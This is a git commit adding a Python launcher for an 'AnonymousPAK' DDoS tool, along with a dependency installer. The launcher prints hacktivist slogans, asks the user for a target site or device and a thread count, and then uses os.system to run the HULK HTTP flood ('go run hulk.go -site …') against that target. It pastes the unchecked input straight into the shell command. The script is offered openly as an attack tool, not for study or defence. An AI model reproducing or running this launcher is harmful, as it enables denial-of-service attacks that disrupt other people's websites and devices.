47f63a78fe997f5e97dfc5d34718e86731792118
UBISOFT-1 <54579186+UBISOFT-1@users.noreply.github.com>
2020-05-11 08:55:09 +0500

    Anonymous DDoS Tool Version 0.1

---
+++ Install_Dependancies.py
@@ -0,0 +1,21 @@
+import os
+print('[+] Installing Dependancies for AnonymousPAK DDoS Attack')
+print('[+] Download GoLang from Golang.org/dl/')
+try:
+    os.system('python3 -m pip install pyfiglet')
+    os.system('pip3 install pyfiglet')
+    os.system('py -m pip install pyfiglet')
+    os.system('python -m pip install pyfiglet')
+    os.system('python3 -m pip install pyttsx3')
+    os.system('pip3 install pyttsx3')
+    os.system('py -m pip install pyttsx3')
+    os.system('python -m pip install pyttsx3')
+    os.system('python3 -m pip install colorama')
+    os.system('pip3 install colorama')
+    os.system('py -m pip install colorama')
+    os.system('python -m pip install colorama')
+    print(
+        '''[+] If this comes and you are on any OS just Ignore only if there is a py command not found as below;
+          sh: py: command not found''')
+except:
+    print('Just Install Pyfiglet, Pyttsx3 and GoLang and Colorma')
---
+++ Python-Script.py
@@ -0,0 +1,56 @@
+from colorama import Fore, Back, Style
+#print(Fore.RED + 'some red text')
+#print(Back.GREEN + 'and with a green background')
+#print(Style.DIM + 'and in dim text')
+#print(Style.RESET_ALL)
+#print('back to normal now')
+import os
+import pyttsx3
+import sys
+import platform
+def say_stuff(stuff_to_say):
+    engine = pyttsx3.init()
+    engine.say(str(stuff_to_say))
+    engine.runAndWait()
+print(Fore.GREEN + Back.BLACK)
+os.system('pyfiglet AnonymousPAK  DDoS Attack')
+
+print(Back.GREEN + Fore.GREEN +'[+] Anonymous DDoS tool by' + Fore.RED + 'Anonymous Pakistan Community                              ') 
+print(Back.GREEN + Fore.BLACK + '[+] AnonPAK-DDoS Tool BETA VERSION 0.1                                             ')
+print(Back.BLACK +Fore.GREEN + '[+] AnonPAK-DDoS Tool Interactive Menu in Python by Muneeb Khurram                         ')
+print(Fore.YELLOW + '[+] We are Anonymous, We are a Legion, We do not Forgive, We do not Forget                            ')
+print(Fore.GREEN + '[+] Starting AnonPAK DoS Tool with 1024 Baseline Threads as Default change below as Required           ')
+print(Fore.BLUE + 'Author: ' + Fore.GREEN + 'Muneeb Khurram (UBISOFT-1)')
+print(Fore.RED + 'Youtube: ' + Fore.GREEN + 'https://www.youtube.com/channel/UCzYulTuhxSIqSlW2PqTkkEw')
+print(Fore.YELLOW + 'GitHub: ' + Fore.GREEN + 'https://github.com/ubisoft-1')
+print('Your OS:'+ Fore.RED + str(platform.system())+Fore.GREEN)
+try:
+    threads = input('[+] ENTER THE NUMBER OF' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS >>>')
+    site = input(Fore.BLUE + '[+] Enter the Site that You want to' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
+    colab_status = input(Fore.YELLOW + 'Are you DDoS with Google Collab [Y/N]')
+    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' For a Very Small'+Fore.RED+' Target'+Fore.GREEN+' Like a Device and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' >>>')
+    if 'Y' == colab_status:
+        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
+    if 'y' == colab_status:
+        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
+    if 'n' == colab_status:
+        say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
+    if 'N' == colab_status:
+        say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
+
+    print('[+] Executing Command as Follows')
+    print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
+    if 'Windows' in str(platform.system()):
+        os.system('go run hulk.go -site {0}'.format(site))
+    else:
+        os.system('HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
+    print(Back.BLACK + Fore.GREEN)
+    
+except:
+    print(Fore.RED + '[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
+    print('[+] Installing Pyfiglet')
+    os.system('pip3 install pyfiglet')
+    os.system('python3 -m pip install pyfiglet')
+    os.system('py -m pip install pyfiglet')
+    print(Style.RESET_ALL)
+
